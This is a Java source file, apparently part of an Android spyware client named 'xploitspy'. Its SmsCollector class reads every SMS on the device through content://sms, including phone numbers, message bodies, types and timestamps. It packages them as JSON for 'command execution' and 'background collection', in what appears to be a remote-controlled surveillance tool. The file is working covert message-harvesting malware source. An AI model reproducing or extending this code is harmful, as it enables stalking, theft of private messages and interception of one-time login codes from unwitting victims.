package com.xploitspy.client.collector;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

/**
 * SmsCollector - Mengumpulkan data SMS
 */
public class SmsCollector {
    
    private static final String TAG = "SmsCollector";
    private Context context;
    private long lastSmsId = 0;
    
    public SmsCollector(Context context) {
        this.context = context;
    }
    
    public JSONArray collect() {
        return collectNew(); // Collect only new SMS for regular collection
    }
    
    public JSONArray collectAll() {
        // Collect all SMS (for command execution)
        JSONArray smsList = new JSONArray();
        
        try {
            Uri uri = Uri.parse("content://sms");
            String[] projection = {"_id", "address", "body", "type", "date"};
            String sortOrder = "date DESC"; // Most recent first
            
            Cursor cursor = context.getContentResolver().query(
                uri, projection, null, null, sortOrder
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    long id = cursor.getLong(0);
                    String address = cursor.getString(1);
                    String body = cursor.getString(2);
                    int type = cursor.getInt(3);
                    long date = cursor.getLong(4); // Real timestamp from SMS
                    
                    if (address != null && body != null) {
                        JSONObject sms = new JSONObject();
                        sms.put("phoneNumber", address);
                        sms.put("message", body);
                        // Android SMS types: 1=INBOX, 2=SENT, 3=DRAFT, 4=OUTBOX, 5=FAILED, 6=QUEUED
                        String smsType;
                        switch (type) {
                            case 1: // INBOX
                                smsType = "inbox";
                                break;
                            case 2: // SENT
                                smsType = "sent";
                                break;
                            case 3: // DRAFT
                                smsType = "draft";
                                break;
                            case 4: // OUTBOX
                                smsType = "outbox";
                                break;
                            case 5: // FAILED
                                smsType = "failed";
                                break;
                            case 6: // QUEUED
                                smsType = "queued";
                                break;
                            default:
                                smsType = "unknown";
                                break;
                        }
                        sms.put("type", smsType);
                        sms.put("timestamp", date); // Use real timestamp from SMS
                        
                        smsList.put(sms);
                    }
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting all SMS", e);
        }
        
        return smsList;
    }
    
    private JSONArray collectNew() {
        // Collect only new SMS (for regular background collection)
        JSONArray smsList = new JSONArray();
        
        try {
            Uri uri = Uri.parse("content://sms");
            String[] projection = {"_id", "address", "body", "type", "date"};
            String selection = "_id > ?";
            String[] selectionArgs = {String.valueOf(lastSmsId)};
            String sortOrder = "_id ASC";
            
            Cursor cursor = context.getContentResolver().query(
                uri, projection, selection, selectionArgs, sortOrder
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    long id = cursor.getLong(0);
                    String address = cursor.getString(1);
                    String body = cursor.getString(2);
                    int type = cursor.getInt(3);
                    long date = cursor.getLong(4); // Real timestamp from SMS
                    
                    if (address != null && body != null) {
                        JSONObject sms = new JSONObject();
                        sms.put("phoneNumber", address);
                        sms.put("message", body);
                        sms.put("type", type == 1 ? "inbox" : "sent");
                        sms.put("timestamp", date); // Use real timestamp from SMS
                        
                        smsList.put(sms);
                        lastSmsId = Math.max(lastSmsId, id);
                    }
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting SMS", e);
        }
        
        return smsList;
    }
}

